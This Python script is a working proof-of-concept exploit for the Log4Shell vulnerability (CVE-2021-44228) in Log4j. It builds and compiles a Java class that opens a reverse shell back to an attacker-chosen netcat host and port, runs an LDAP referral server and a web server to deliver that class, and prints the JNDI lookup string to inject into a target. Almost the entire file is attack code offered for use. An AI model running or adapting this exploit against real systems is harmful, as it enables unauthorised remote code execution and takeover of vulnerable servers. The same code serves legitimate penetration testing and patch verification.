#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path

from http.server import HTTPServer, SimpleHTTPRequestHandler


def generate_payload(ncip: str, ncport: int) -> None:
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
""" % (ncip, ncport)

    # writing the exploit to Exploit.java file

    p = Path("Exploit.java")

    try:
        p.write_text(program)
        subprocess.run(["./jdk1.8.0_20/bin/javac", str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')


def payload(webip: str, webport: int, ncip: str, ncport: int) -> None:
    generate_payload(ncip, ncport)

    print(Fore.GREEN + '[+] Setting up LDAP server\n')

    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(webip, webport))
    t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def check_java() -> bool:
    exit_code = subprocess.call([
        './jdk1.8.0_20/bin/java',
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0


def ldap_server(webip: str, webport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (webip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = "http://{}:{}/#Exploit".format(webip, webport)
    subprocess.run([
        "./jdk1.8.0_20/bin/java",
        "-cp",
        "target/marshalsec-0.0.3-SNAPSHOT-all.jar",
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


def main() -> None:
    init(autoreset=True)
    print(Fore.BLUE+"""
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc
""")

    parser = argparse.ArgumentParser(description='log4shell PoC')
    parser.add_argument('--webip',
                        metavar='webip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer')
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')
    parser.add_argument('--ncip', 
                        metavar='ncip', 
                        type=str,
                        default='localhost', 
                        help='Netcat IP')
    parser.add_argument('--ncport',
                        metavar='ncport',
                        type=int,
                        default='9001',
                        help='Netcat Port')

    args = parser.parse_args()

    try:
        if not check_java():
            print(Fore.RED + '[-] Java is not installed inside the repository')
            raise SystemExit(1)
        payload(args.webip, args.webport, args.ncip, args.ncport)
    except KeyboardInterrupt:
        print(Fore.RED + "user interupted the program.")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
